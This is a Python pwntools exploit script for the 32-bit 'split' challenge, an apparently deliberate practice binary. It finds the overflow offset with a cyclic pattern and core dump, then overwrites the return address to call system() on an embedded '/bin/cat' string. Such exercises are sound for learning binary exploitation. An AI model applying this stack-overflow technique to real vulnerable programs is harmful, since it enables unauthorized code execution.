#!/bin/usr/python3
from pwn import *

def start():
	binary_path = "./split32"
	p = process(binary_path)
	gdb.attach(p, gdbscript='''
		break main
		continue
	''')
	return p

elf = context.binary = ELF("./split32")
context.log_level = "info"
context.delete_corefiles = True

system_addr = elf.symbols.system
# if we just use "elf.search(b'/bin/cat')", it will return a generator instead of a value.
# we need to use "next" to get the value from the generator
bincat_addr = next(elf.search(b'/bin/cat'))
info("system_addr = %#x", system_addr)
info("bincat_addr = %#x", bincat_addr)

io = start()
payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

eip = core.eip
#pattern = core.read(eip, 4)
eip_offset = cyclic_find(eip)
info("eip_offset = %d", eip_offset)

io = start()

# we need to add '0' after system_addr for the return pointer of syscall
payload = flat(
	asm('nop') * eip_offset,
	system_addr,
	0,
	bincat_addr
)

f = open("./payload", "wb")
f.write(payload)
f.close()
io.sendlineafter(">", payload)
while 1:
	tmp = io.recv()
	info(tmp)


